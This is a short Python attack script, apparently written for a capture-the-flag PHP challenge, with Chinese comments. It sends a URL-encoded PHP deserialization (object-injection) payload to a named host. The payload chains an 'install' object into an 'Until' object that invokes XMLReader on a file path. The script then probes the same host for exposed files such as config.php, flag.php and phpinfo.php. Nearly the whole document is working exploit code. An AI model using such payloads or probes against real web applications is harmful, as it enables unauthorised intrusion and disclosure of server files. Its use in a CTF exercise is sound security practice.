import requests

# 尝试读取不存在的文件，看错误信息
nonexist_url = "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22XMLReader%22%3Bs%3A1%3A%22b%22%3Bs%3A19%3A%22%2Fnonexistent_file_test%22%3Bs%3A1%3A%22c%22%3BN%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"

print("Testing with nonexistent file...")
response = requests.get(nonexist_url, timeout=15)
print(f"Status: {response.status_code}\n")
print(response.text)

# 同时检查原始网页有没有其他可访问的文件
base_url = "http://f7c8a2a3.clsadp.com/"
files_to_check = ['config.php', 'install.lock', 'flag.php', 'flag', 'phpinfo.php']

print("\n" + "="*70)
print("Checking for accessible files...")
print("="*70)

for filename in files_to_check:
    url = base_url + filename
    try:
        r = requests.get(url, timeout=10)
        print(f"\n{filename}: Status {r.status_code}, Length {len(r.text)}")
        if r.status_code == 200 and len(r.text) < 500:
            print(f"Content: {r.text}")
    except:
        print(f"\n{filename}: Failed to access")
